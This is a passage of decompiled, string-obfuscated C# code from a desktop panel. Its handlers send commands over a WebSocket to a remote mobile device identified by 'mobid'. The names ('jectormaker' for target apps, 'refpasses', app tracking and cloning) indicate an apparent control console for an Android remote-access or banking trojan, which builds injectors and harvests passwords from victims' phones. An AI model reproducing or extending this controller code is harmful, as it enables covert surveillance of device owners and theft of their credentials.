				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._66470B55, appid);
				string value = BTCommand.FormatCommand(EXGuarder._68726166, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._67543B60, BTConst.wrk);
				dictionary.Add(EXGuarder._131D661E, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._62716D0B, appid);
				string value = BTCommand.FormatCommand(EXGuarder._6B5E1076, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._3106324F, BTConst.wrk);
				dictionary.Add(EXGuarder._2E4C3A48, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string arg = selectedRow.Cells[1].Value.ToString();
				string _426B3C3B = EXGuarder._426B3C3B;
				myinputs myinputs2 = new myinputs();
				myinputs2.msgtitle.Text = string.Format(EXGuarder._1B230E38, BTConst.trkinfostr, arg);
				myinputs2.inputtext.Text = EXGuarder._426B3C3B;
				myinputs2.inputtext.Watermark = EXGuarder._35790D15;
				myinputs2.combostext.Visible = true;
				myinputs2.combostext.Items.Add(EXGuarder._10527337);
				myinputs2.combostext.Items.Add(EXGuarder._23753D41);
				myinputs2.combostext.Text = EXGuarder._10527337;
				if (myinputs2.ShowDialog() != DialogResult.OK)
				{
					break;
				}
				_426B3C3B = myinputs2.inputtext.Text;
				if (codes.StrisEmpty(_426B3C3B))
				{
					_426B3C3B = EXGuarder._432A5B26;
				}
				string trktype = EXGuarder._52204129;
				if (Operators.CompareString(myinputs2.combostext.Text, EXGuarder._23753D41, TextCompare: false) == 0)
				{
					trktype = EXGuarder._586E350C;
				}
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_14<string, string, string, string> data = new VB_0024AnonymousType_14<string, string, string, string>(EXGuarder._2E2D1276, appid, trktype, _426B3C3B);
				string value = BTCommand.FormatCommand(EXGuarder._41286F25, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._12510470, BTConst.wrk);
				dictionary.Add(EXGuarder._3A252A65, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._4D6B124B, appid);
				string value = BTCommand.FormatCommand(EXGuarder._384A5F6F, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._126F2353, BTConst.wrk);
				dictionary.Add(EXGuarder._2201231B, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._550E1007, appid);
				string value = BTCommand.FormatCommand(EXGuarder._36094227, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._34150545, BTConst.wrk);
				dictionary.Add(EXGuarder._08591B41, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._7110232B, appid);
				string value = BTCommand.FormatCommand(EXGuarder._61511806, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._38743B70, BTConst.wrk);
				dictionary.Add(EXGuarder._262B1F13, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void refpasses_Click(object sender, EventArgs e)
	{
		VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._1F4A085C);
		string value = BTCommand.FormatCommand(EXGuarder._71152539, data);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._654E3314, BTConst.wrk);
		dictionary.Add(EXGuarder._32087539, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void ToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string targetid = selectedRow.Tag.ToString();
				jectormaker jectormaker2 = new jectormaker();
				jectormaker jectormaker3 = jectormaker2;
				jectormaker3.targetid = targetid;
				jectormaker3.mobid = Btcli.mobid;
				jectormaker3.srvinfo = Btcli.Serverins;
				jectormaker3.targeticon.Image = (Bitmap)selectedRow.Cells[0].Value;
				jectormaker3 = null;
				jectormaker2.Show();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string value = selectedRow.Tag.ToString();
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._3113741D, EXGuarder._50560664);
				dictionary.Add(EXGuarder._5A1E6C3A, value);
				dictionary.Add(EXGuarder._72323954, EXGuarder._081B2823);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CloneAppToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string value = selectedRow.Tag.ToString();
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._48005E04, EXGuarder._35592411);
				dictionary.Add(EXGuarder._34595506, EXGuarder._50362B6A);
				dictionary.Add(EXGuarder._1F173D37, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3C2F0412, EXGuarder._234C6132);
		dictionary.Add(EXGuarder._624E4651, EXGuarder._27775B21);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void enablebtn_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._774F1550, EXGuarder._74280609);
		dictionary.Add(EXGuarder._6612256C, EXGuarder._6E563D0F);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void disablebtn_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._76360C46, EXGuarder._5D12126B);
		dictionary.Add(EXGuarder._44015159, EXGuarder._562D2344);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void OpenCloneToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV_CLONE.SelectedRows)
		{
			try
			{
				string value = selectedRow.Tag.ToString();
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._370A4E24, EXGuarder._63412028);
				dictionary.Add(EXGuarder._06785F10, EXGuarder._6438575A);
				dictionary.Add(EXGuarder._6D500C59, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void RemoveCloneToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV_CLONE.SelectedRows)
		{
			try
			{
				string value = selectedRow.Tag.ToString();
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._72320B5E, EXGuarder._2D374B77);
				dictionary.Add(EXGuarder._53602A50, EXGuarder._5654176A);
				dictionary.Add(EXGuarder._08660912, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _1A4E = EXGuarder._1A4E5856;
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._263B1C00;
		myinputs2.inputtext.Text = EXGuarder._1A4E5856;
		myinputs2.inputtext.Watermark = EXGuarder._5A323246;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_1A4E = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(_1A4E))
		{
			_1A4E = EXGuarder._5A24356B;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_15<string, string, string> data = new VB_0024AnonymousType_15<string, string, string>(EXGuarder._4837581C, _1A4E, appid);
				string value = BTCommand.FormatCommand(EXGuarder._310B3666, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._6F626A5A, BTConst.wrk);
				dictionary.Add(EXGuarder._363E1A32, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._201E711C, appid);
				string value = BTCommand.FormatCommand(EXGuarder._18776970, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._64167312, BTConst.wrk);
				dictionary.Add(EXGuarder._0B034561, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem12_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._5D095920, appid);
				string value = BTCommand.FormatCommand(EXGuarder._6E4D0933, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._1C3A0631, BTConst.wrk);
				dictionary.Add(EXGuarder._544C125C, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._176E2B10, appid);
				string value = BTCommand.FormatCommand(EXGuarder._5E5F5747, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._016A3D44, BTConst.wrk);
				dictionary.Add(EXGuarder._333F1855, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem13_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._11260D6A, appid);
				string value = BTCommand.FormatCommand(EXGuarder._2C383353, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._4C483040, BTConst.wrk);
				dictionary.Add(EXGuarder._3B0B4714, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}
}
